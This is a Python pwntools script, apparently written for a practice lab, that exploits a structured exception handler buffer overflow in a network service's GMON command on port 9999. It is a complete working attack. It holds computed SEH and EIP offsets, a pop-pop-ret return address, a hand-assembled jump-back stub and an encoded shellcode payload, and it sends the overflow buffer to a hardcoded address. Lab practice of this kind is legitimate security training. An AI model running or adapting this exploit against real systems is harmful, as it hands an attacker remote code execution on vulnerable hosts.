from pwn import *

ip = "192.168.15.172"
port = 9999

cmd = "GMON /.:/"
offset_to_eip = 3528 #or Seh offset --> pwn cyclic -l 0x61696A62
nSeh = 3524 #pwn cyclic -l 0x61686A62
new_eip = 0x625010B4 #pop pop ret --> !mona seh --> 0x625010B4
new_nSeh = 0x909006EB #jmp 6 + nopsled
align =  0x565 #0198f209 (start of buffer) - 0198eca4 (esp after short jump)

'''
pwn asm -f hex 'push esp' --> 54
pwn asm -f hex 'pop eax' --> 58
pwn asm -f hex 'add ax, 0x565' --> 66056505
pwn asm -f hex 'jmp eax' --> ffe0

'''
jumpback = b'\x54\x58\x66\x05\x65\x05\xff\xe0'

shellcode =  b"\x90"*20
shellcode += b"\xdb\xd4\xbd\x9e\xa6\xa1\xfa\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x52\x31\x6a\x17\x03\x6a\x17"
shellcode += b"\x83\x5c\xa2\x43\x0f\x9c\x43\x01\xf0\x5c\x94"
shellcode += b"\x66\x78\xb9\xa5\xa6\x1e\xca\x96\x16\x54\x9e"
shellcode += b"\x1a\xdc\x38\x0a\xa8\x90\x94\x3d\x19\x1e\xc3"
shellcode += b"\x70\x9a\x33\x37\x13\x18\x4e\x64\xf3\x21\x81"
shellcode += b"\x79\xf2\x66\xfc\x70\xa6\x3f\x8a\x27\x56\x4b"
shellcode += b"\xc6\xfb\xdd\x07\xc6\x7b\x02\xdf\xe9\xaa\x95"
shellcode += b"\x6b\xb0\x6c\x14\xbf\xc8\x24\x0e\xdc\xf5\xff"
shellcode += b"\xa5\x16\x81\x01\x6f\x67\x6a\xad\x4e\x47\x99"
shellcode += b"\xaf\x97\x60\x42\xda\xe1\x92\xff\xdd\x36\xe8"
shellcode += b"\xdb\x68\xac\x4a\xaf\xcb\x08\x6a\x7c\x8d\xdb"
shellcode += b"\x60\xc9\xd9\x83\x64\xcc\x0e\xb8\x91\x45\xb1"
shellcode += b"\x6e\x10\x1d\x96\xaa\x78\xc5\xb7\xeb\x24\xa8"
shellcode += b"\xc8\xeb\x86\x15\x6d\x60\x2a\x41\x1c\x2b\x23"
shellcode += b"\xa6\x2d\xd3\xb3\xa0\x26\xa0\x81\x6f\x9d\x2e"
shellcode += b"\xaa\xf8\x3b\xa9\xcd\xd2\xfc\x25\x30\xdd\xfc"
shellcode += b"\x6c\xf7\x89\xac\x06\xde\xb1\x26\xd6\xdf\x67"
shellcode += b"\xe8\x86\x4f\xd8\x49\x76\x30\x88\x21\x9c\xbf"
shellcode += b"\xf7\x52\x9f\x15\x90\xf9\x5a\xfe\x5f\x55\x6b"
shellcode += b"\xab\x37\xa4\x73\x42\x94\x21\x95\x0e\x34\x64"
shellcode += b"\x0e\xa7\xad\x2d\xc4\x56\x31\xf8\xa1\x59\xb9"
shellcode += b"\x0f\x56\x17\x4a\x65\x44\xc0\xba\x30\x36\x47"
shellcode += b"\xc4\xee\x5e\x0b\x57\x75\x9e\x42\x44\x22\xc9"
shellcode += b"\x03\xba\x3b\x9f\xb9\xe5\x95\xbd\x43\x73\xdd"
shellcode += b"\x05\x98\x40\xe0\x84\x6d\xfc\xc6\x96\xab\xfd"
shellcode += b"\x42\xc2\x63\xa8\x1c\xbc\xc5\x02\xef\x16\x9c"
shellcode += b"\xf9\xb9\xfe\x59\x32\x7a\x78\x66\x1f\x0c\x64"
shellcode += b"\xd7\xf6\x49\x9b\xd8\x9e\x5d\xe4\x04\x3f\xa1"
shellcode += b"\x3f\x8d\x5f\x40\x95\xf8\xf7\xdd\x7c\x41\x9a"
shellcode += b"\xdd\xab\x86\xa3\x5d\x59\x77\x50\x7d\x28\x72"
shellcode += b"\x1c\x39\xc1\x0e\x0d\xac\xe5\xbd\x2e\xe5"


payload = fit({
	0:cmd,
	len(cmd):shellcode,	
	nSeh:new_nSeh,
	offset_to_eip:new_eip,
	offset_to_eip+4:jumpback,
	}, length=5011)

connect = remote(ip,port)
connect.readline()
connect.sendline(payload)